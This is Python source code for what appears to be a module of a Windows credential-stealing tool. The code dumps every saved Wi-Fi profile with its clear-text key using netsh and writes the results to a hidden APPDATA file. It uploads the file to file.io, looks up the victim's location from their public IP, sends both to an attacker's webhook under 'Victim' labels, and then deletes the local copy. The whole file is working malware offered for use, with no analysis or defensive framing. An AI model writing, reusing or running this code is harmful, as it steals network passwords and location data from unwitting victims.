import subprocess
import os
from config import Config
from json import loads
from __webhook import _WebhookX
from dhooks import Embed
from urllib.request import Request, urlopen
from urllib.error import URLError
import requests
from _random_string import *

cc = Config()

class Info():
    def __init__(self):
        self.ip = self.get_public_ip()

    def run_command(self, command):
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')
        return stdout, stderr

    def get_wifi_profiles(self):
        output, _ = self.run_command('netsh wlan show profiles')
        profile_names = [profile.strip() for profile in output.split(":")]
        return profile_names

    def get_wifi_profile_output(self, profile_name):
        command = f'netsh wlan show profile name="{profile_name}" key=clear'
        output, _ = self.run_command(command)
        return output

    def get_public_ip(self):
        try:
            response = urlopen(Request("https://api.ipify.org"), timeout=10)
            return response.read().decode().strip()
        except URLError:
            return "Unknown"

    def main(self):
        wifi_profiles = self.get_wifi_profiles()
        rndm_strr = get_random_string(25)
        self.path = f"{os.getenv('APPDATA')}\\ROSE_ON_TOP\\wifi-stealer_{rndm_strr}.txt"
        with open(self.path, "w", encoding="utf-8") as file:
            for profile_name in wifi_profiles:
                profile_output = self.get_wifi_profile_output(profile_name)
                file.write(profile_output + "\n")
                file.write("-" * 50 + "\n")

        upload_url = "https://file.io"
        files = {"file": (os.path.basename(self.path), open(self.path, "rb"))}
        response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            self.wif_dwnld_l = response.json().get("link", "Unknown")
        else:
            self.wif_dwnld_l = "Unknown"
    
    def global_info(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
            if response.status_code == 200:
                ipdata = response.json()
                obj = {
                    "Country": ipdata.get("country", "Unknown"),
                    "City": ipdata.get("city", "Unknown"),
                    "Postal": ipdata.get("postal", "Unknown"),
                    "Latitude": ipdata.get("loc", "Unknown").split(",")[0],
                    "Longitude": ipdata.get("loc", "Unknown").split(",")[1],
                    "State": ipdata.get("region", "Unknown")
                }
                return obj
            else:
                return {}
        except Exception:
            return {}

    def send_data(self):
        webx = _WebhookX().get_object()

        self.main()

        embed = Embed(
            description='IP & Wi-Fi Information',
            color=cc.get_color(),
            timestamp='now'
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        global_info_data = self.global_info()
        ip_info = "\n".join([f"{key}: {value}" for key, value in global_info_data.items()])
        embed.add_field(name='Victim IP data...', value=ip_info)

        embed.add_field(name='Victim Wi-Fi data...', value=f'[Wi-Fi data]({self.wif_dwnld_l})')

        webx.send(embed=embed)
        os.remove(self.path)

    @staticmethod
    def get_username():
        return os.getlogin()
